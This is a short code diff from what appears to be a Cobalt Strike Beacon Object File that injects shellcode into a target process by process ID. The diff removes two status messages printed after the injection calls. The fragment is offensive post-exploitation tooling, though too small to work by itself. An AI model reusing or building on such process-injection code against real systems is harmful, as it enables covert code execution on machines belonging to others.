@@ -131,7 +131,6 @@ VOID InjectExplicitGo( _In_ PVOID Argv, _In_ INT Argc, _In_ BOOLEAN x64 )
 					#if ! defined( _WIN64 )
 					EnterShellcode64( Payload64, Pid, Ofs, Buf, Len, 0, NULL, &Ret );
 					#endif
-					BeaconPrintf( CALLBACK_OUTPUT, "Success! 0x%x", Ret );
 				} else 
 				{
 					#if ! defined( _WIN64 )
@@ -139,7 +138,6 @@ VOID InjectExplicitGo( _In_ PVOID Argv, _In_ INT Argc, _In_ BOOLEAN x64 )
 					#else
 					Ret = EnterShellcode( Payload64, Pid, Ofs, Buf, Len );
 					#endif
-					BeaconPrintf( CALLBACK_OUTPUT, "Failure!" );
 				};
 			} while ( 0 );
 
